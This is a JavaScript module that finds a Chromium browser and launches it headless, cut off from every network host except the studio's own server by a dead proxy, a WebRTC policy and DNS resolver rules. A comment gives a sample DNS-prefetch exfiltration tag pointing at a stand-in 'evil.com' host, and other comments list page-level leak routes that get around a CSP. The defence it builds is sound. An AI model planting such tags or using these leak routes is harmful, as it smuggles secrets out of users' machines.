// browser.js: find a Chromium-based browser and launch it headless with the GPU flags the renderer needs, cut off from
// every host but the studio's own server.
// Order: an explicit path, $CHROME_PATH (unless fromEnv is false), an installed Chrome/Chromium/Edge/Brave, then a
// standalone chrome-headless-shell (`bun run get-browser` puts one in .browsers/; Puppeteer's and Playwright's caches too).
import puppeteer from 'puppeteer-core';
import { existsSync, readdirSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { homedir } from 'node:os';

const ROOT = resolve(import.meta.dir, '..');

// Where to look for an installed browser and for standalone ones (tests pass their own lists).
const INSTALLED = {
  darwin: ['Google Chrome', 'Chromium', 'Microsoft Edge', 'Brave Browser', 'Google Chrome Canary']
    .flatMap(n => [`/Applications/${n}.app/Contents/MacOS/${n}`, join(homedir(), `Applications/${n}.app/Contents/MacOS/${n}`)]),
  win32: ['Google/Chrome/Application/chrome.exe', 'Chromium/Application/chrome.exe', 'Microsoft/Edge/Application/msedge.exe',
    'BraveSoftware/Brave-Browser/Application/brave.exe']
    .flatMap(p => [process.env.PROGRAMFILES, process.env['PROGRAMFILES(X86)'], process.env.LOCALAPPDATA].filter(Boolean).map(d => join(d, p))),
  linux: ['/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium', '/usr/bin/chromium-browser',
    '/snap/bin/chromium', '/usr/bin/microsoft-edge', '/usr/bin/brave-browser'],
}[process.platform] || [];
const CACHES = [join(ROOT, '.browsers'), join(homedir(), '.cache/puppeteer'), join(homedir(), 'Library/Caches/ms-playwright'),
  join(homedir(), '.cache/ms-playwright'), process.env.LOCALAPPDATA && join(process.env.LOCALAPPDATA, 'ms-playwright')].filter(Boolean);

// Throws when there is none: the studio server paints in-process (studio/frames/pool.js), so a missing browser must
// fail the painting, not end the process; render.mjs reports it and exits itself.
export function findBrowser(explicit, { fromEnv = true, installed = INSTALLED, caches = CACHES } = {}) {
  if (explicit) return explicit;
  if (fromEnv && process.env.CHROME_PATH) return process.env.CHROME_PATH;
  const found = installed.find(p => existsSync(p));
  if (found) return found;
  const names = new Set(['chrome-headless-shell', 'chrome-headless-shell.exe', 'headless_shell', 'headless_shell.exe']);
  const search = (dir, depth) => {
    if (depth < 0 || !existsSync(dir)) return [];
    return readdirSync(dir, { withFileTypes: true }).sort((a, b) => b.name.localeCompare(a.name, undefined, { numeric: true }))
      .flatMap(e => e.isDirectory() ? search(join(dir, e.name), depth - 1) : names.has(e.name) ? [join(dir, e.name)] : []);
  };
  for (const c of caches) { const [hit] = search(c, 4); if (hit) return hit; }
  throw new Error('No Chromium-based browser found. Either run `bun run get-browser` (downloads a standalone headless Chromium ' +
    'into .browsers/, ~100 MB, no Chrome install needed) or point CHROME_PATH (or render.mjs\'s --chrome=) at a Chrome, Edge, Brave or Chromium binary.');
}

// GPU backend for WebGL: Metal on macOS, D3D11 on Windows, the platform default elsewhere.
export const ANGLE = { darwin: 'metal', win32: 'd3d11' }[process.platform];

// What painting needs: WebGL on the GPU, a 1080p window, and no throttling of a page nobody is looking at.
export const gpuArgs = (angle = ANGLE) => ['--ignore-gpu-blocklist', ...(angle ? ['--use-angle=' + angle] : []), '--enable-gpu-rasterization',
  '--window-size=1920,1080', '--disable-renderer-backgrounding', '--disable-background-timer-throttling'];

// A DNS lookup itself can carry data out (e.g. a chapter adding <link rel=dns-prefetch href="//<secret>.evil.com">)
// without ever making a request render.mjs's interception or the CSP would see. host-resolver-rules answers every
// hostname but these with NOTFOUND before Chrome would otherwise resolve it for real — EXCLUDE rules are matched in
// order and win over the catch-all MAP that follows, so they have to come first. IP literals go through these rules
// too (verified: without its EXCLUDE, 127.0.0.1 fails with ERR_NAME_NOT_RESOLVED), so any address but the two loopback
// ones is refused as well; an IPv6 literal is matched without its brackets (`[::1]` never matches, `::1` does).
export const HOST_RESOLVER_RULES = ['localhost', '*.localhost', '127.0.0.1', '::1']
  .map(h => `EXCLUDE ${h}`).concat('MAP * ~NOTFOUND').join(', ');

// Version code must not reach any host but this studio (the fonts studio.html uses are bundled in assets/fonts/, so
// no exception is needed for Google Fonts any more). studio.html's policy and sandbox and render.mjs's request
// interception and popup and navigation guards each close some ways out, but none closes them all: <link
// rel=prerender> and preconnect, and WebRTC's TURN over TCP, go around the page and its policy altogether, and so,
// before the sandbox, did popups (their requests aren't the page's to intercept). So the network stack itself is
// closed: every connection goes to a proxy that isn't there (127.0.0.1:9, the discard port, where nothing normally
// listens), except to the studio's own port on loopback, which goes direct. Chrome sends everything on loopback
// direct by default, whatever the port — <-loopback> turns that off, so that only the studio's port is reachable,
// not every other service on this machine. (Verified against Chrome: without <-loopback>, 127.0.0.1, localhost and
// *.localhost on another port all bypass the proxy; with it and these port-pinned entries, only the studio's port
// loads, and anything else fails with ERR_PROXY_CONNECTION_FAILED.) The WebRTC policy keeps WebRTC to proxied TCP
// (it needs both: without the policy, STUN over UDP still gets out past the proxy; without the proxy, TURN over TCP
// gets out past the policy), and host-resolver-rules stays as a second layer under the proxy. `port` is the studio
// server's.
export function isolationArgs(port) {
  if (!(Number.isInteger(+port) && +port > 0 && +port < 65536)) throw new Error(`isolationArgs needs the studio server's port, not ${port}`);
  const direct = ['<-loopback>', ...['localhost', '*.localhost', '127.0.0.1', '[::1]'].map(h => `${h}:${+port}`)];
  return ['--proxy-server=http://127.0.0.1:9', '--proxy-bypass-list=' + direct.join(';'),
    '--force-webrtc-ip-handling-policy=disable_non_proxied_udp', '--webrtc-ip-handling-policy=disable_non_proxied_udp',
    '--host-resolver-rules=' + HOST_RESOLVER_RULES];
}

export const browserArgs = ({ angle = ANGLE, port }) => [...gpuArgs(angle), ...isolationArgs(port)];

// port: the studio server's port, the only one on this machine the browser may reach. Rejects (never exits) when
// there's no browser to launch or it won't start. pipe: puppeteer talks to Chrome over a pipe instead of a WebSocket,
// so Chrome exits when the process that launched it does, however that ends (SIGKILL included): no painting browser
// outlives its studio, render.mjs or test.
export async function launchBrowser({ chrome, angle = ANGLE, fromEnv = true, port } = {}) {
  return puppeteer.launch({ executablePath: findBrowser(chrome, { fromEnv }), headless: true, pipe: true, protocolTimeout: 0, args: browserArgs({ angle, port }) });
}
